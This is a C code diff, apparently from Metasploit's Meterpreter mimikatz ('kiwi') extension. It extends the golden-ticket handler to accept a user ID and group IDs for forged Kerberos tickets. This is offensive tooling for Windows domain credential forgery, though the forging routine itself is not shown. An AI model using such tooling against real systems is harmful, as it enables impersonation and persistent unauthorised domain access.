@@ -93,24 +93,39 @@ DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
  */
 DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet)
 {
-	DWORD result;
+	DWORD dwResult;
 	Packet * response = packet_create_response(packet);
+	DWORD dwGroupCount = 0;
+	DWORD* pdwGroups = NULL;
+	Tlv groupIdTlv;
 	char* user = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_USER);
 	char* domain = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_DOMAIN);
 	char* sid = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_SID);
 	char* tgt = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_TGT);
-
+	DWORD userId = packet_get_tlv_value_uint(packet, TLV_TYPE_KIWI_GOLD_USERID);
 
 	if (!user || !domain || !sid || !tgt)
 	{
-		result = ERROR_INVALID_PARAMETER;
+		dwResult = ERROR_INVALID_PARAMETER;
 	}
 	else
 	{
-		result = mimikatz_kerberos_golden_ticket_create(user, domain, sid, tgt, response);
+		while (packet_enum_tlv(packet, dwGroupCount, TLV_TYPE_KIWI_GOLD_GROUPID, &groupIdTlv) == ERROR_SUCCESS)
+		{
+			pdwGroups = (DWORD*)realloc(pdwGroups, sizeof(DWORD) * (dwGroupCount + 1));
+
+			if (!pdwGroups)
+			{
+				BREAK_WITH_ERROR("Unable to allocate memory for groups", ERROR_OUTOFMEMORY);
+			}
+
+			pdwGroups[dwGroupCount++] = htonl(*(UINT*)groupIdTlv.buffer);
+		}
+
+		dwResult = mimikatz_kerberos_golden_ticket_create(user, domain, sid, tgt, userId, pdwGroups, dwGroupCount, response);
 	}
 
-	packet_transmit_response(result, remote, response);
+	packet_transmit_response(dwResult, remote, response);
 
 	return ERROR_SUCCESS;
 }
